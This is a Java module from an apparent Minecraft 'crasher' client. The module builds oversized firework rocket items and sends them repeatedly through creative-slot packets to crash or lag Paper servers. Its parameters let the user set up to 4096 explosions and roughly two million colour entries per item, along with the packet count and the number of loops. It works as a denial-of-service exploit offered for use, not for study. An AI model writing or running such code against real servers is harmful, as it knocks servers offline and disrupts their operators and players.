package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataFireworks;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeFireworks extends Module {
	private ScheduledExecutorService executorService;

	public CreativeFireworks() {
		super("CreativeFireworks", "Paper creative-slot fireworks explosion bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 1000, "50");
		addArgument("explosions", ArgumentType.INT, 1, 4096, "32");
		addArgument("colors", ArgumentType.INT, 1, 2096000, "2048");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 5000, "5");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int explosions = context.getInt("explosions");
		int colors = context.getInt("colors");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		int[] colorArray = new int[colors];
		Arrays.fill(colorArray, 0xFFFFFF);
		int[] fadeArray = new int[Math.min(colors, 256)];
		Arrays.fill(fadeArray, 0xFF00FF);

		List<DataFireworks.Explosion> explosionList = new ArrayList<>(explosions);
		DataFireworks.Explosion explosion = new DataFireworks.Explosion(0, colorArray, fadeArray, true, true);
		for (int i = 0; i < explosions; i++) {
			explosionList.add(explosion);
		}

		DataComponents components = new DataComponents();
		components.put(new DataFireworks(127, explosionList));
		ItemStack item = new ItemStack(ItemType.FIREWORK_ROCKET.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
